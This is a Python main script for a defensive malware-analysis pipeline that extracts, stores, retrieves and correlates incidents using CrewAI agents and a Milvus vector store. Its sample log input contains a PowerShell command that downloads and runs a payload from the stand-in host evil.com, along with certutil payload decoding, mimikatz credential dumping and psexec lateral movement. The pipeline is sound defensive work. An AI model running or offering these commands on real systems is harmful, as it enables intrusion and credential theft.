"""
Main Pipeline: Extract → Store → Retrieve → Correlate
"""

from agents.agents import extract_events, store_events, retrieve_similar, correlate_incidents

def main():
    # Sample malware logs
    logs = """
2025-10-19 14:30:22 ALERT ransomware.exe -encrypt C:/Users/victim/Documents
2025-10-19 14:31:05 SUSPICIOUS powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
2025-10-19 14:32:11 CRITICAL certutil.exe -decode payload.txt malware.exe
2025-10-19 14:33:45 NETWORK beacon to C2 server 203.0.113.50:443
2025-10-19 14:34:12 CREDENTIAL mimikatz.exe credential dumping
2025-10-19 14:35:03 LATERAL psexec.exe to \\\\DC01\\C$
    """
    
    print("="*80)
    print("CREWAI + MILVUS MALWARE RAG SYSTEM")
    print("="*80 + "\n")
    
    # Step 1: Extract
    print("\n[1/4] EXTRACTING EVENTS...")
    print("-"*80)
    events = extract_events(logs)
    
    if not events:
        print("⚠️  No events extracted. Exiting.")
        return
    
    print(f"\nExtracted {len(events)} events:")
    for i, e in enumerate(events, 1):
        print(f"  {i}. [{e['malware_type']}] {e['summary'][:80]}...")
    
    # Step 2: Store
    print("\n[2/4] STORING IN MILVUS...")
    print("-"*80)
    result = store_events(events)
    print(f"Stored: {result['stored']} events")
    
    # Step 3: Retrieve
    print("\n[3/4] RETRIEVING SIMILAR INCIDENTS...")
    print("-"*80)
    query = events[0]["summary"]  # Use first event as query
    print(f"Query: {query[:100]}...")
    hits = retrieve_similar(query, top_k=5)
    
    if hits:
        print(f"\nFound {len(hits)} similar incidents:")
        for i, h in enumerate(hits, 1):
            print(f"  {i}. [{h['malware_type']}] Score: {h['score']:.3f}")
            print(f"     {h['summary'][:80]}...")
    
    # Step 4: Correlate
    print("\n[4/4] GENERATING CORRELATION REPORT...")
    print("-"*80)
    report = correlate_incidents(events[0]["summary"], hits)
    
    print("\n" + "="*80)
    print("FINAL CORRELATION REPORT")
    print("="*80 + "\n")
    print(report)
    
    print("\n" + "="*80)
    print("✓ PIPELINE COMPLETE")
    print("="*80)


if __name__ == "__main__":
    main()
